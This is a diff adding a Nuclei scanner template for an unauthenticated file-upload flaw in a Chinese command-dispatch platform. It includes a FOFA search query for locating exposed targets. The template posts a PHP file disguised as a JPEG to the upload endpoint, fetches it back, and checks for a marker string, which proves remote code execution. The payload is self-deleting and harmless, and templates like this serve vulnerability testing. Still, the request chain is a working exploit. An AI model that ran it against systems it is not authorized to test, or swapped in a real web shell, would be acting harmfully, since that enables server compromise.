@@ -1,0 +1,60 @@
+id: zhdd-task-uploadfile-fileupload
+
+info:
+  name: 福建科立讯通信-指挥调度平台-文件上传-task-uploadfile
+  author: HuanXiong
+  severity: high
+  metadata:
+    fofa-query: body="app/structure/departments.php" || app="指挥调度管理平台"
+  tags: File Upload
+
+variables:
+  username: "{{to_lower(rand_base(10))}}"
+
+http:
+  - raw:
+      - |
+        POST /api/client/task/uploadfile.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryVBf7Cs8QWsfwC82M
+        Content-Length: 198
+        
+        ------WebKitFormBoundaryVBf7Cs8QWsfwC82M
+        Content-Disposition: form-data; name="uuid"
+
+        1
+        ------WebKitFormBoundaryVBf7Cs8QWsfwC82M
+        Content-Disposition: form-data; name="number"
+
+        122
+        ------WebKitFormBoundaryVBf7Cs8QWsfwC82M
+        Content-Disposition: form-data; name="uploadfile"; filename="{{username}}.php"
+        Content-Type: image/jpeg
+
+        <?php echo pboyjnnrfipmplsukdeczudsefxmywe; unlink(__FILE__); ?>
+        ------WebKitFormBoundaryVBf7Cs8QWsfwC82M--
+
+      - |
+        GET /upload/task/{{filename}} HTTP/1.1
+        Host: {{Hostname}}
+
+    extractors:
+      # 只提取 UUID.php
+      - type: regex
+        name: filename
+        internal: true
+        part: body
+        group: 1
+        regex:
+          - '"url":"[^"]*\/([a-f0-9\-]+\.php)"'
+
+
+    matchers:
+      - type: dsl
+        name: 任意文件上传
+        dsl:
+          - "status_code==200 && contains_all(body,'pboyjnnrfipmplsukdeczudsefxmywe')"
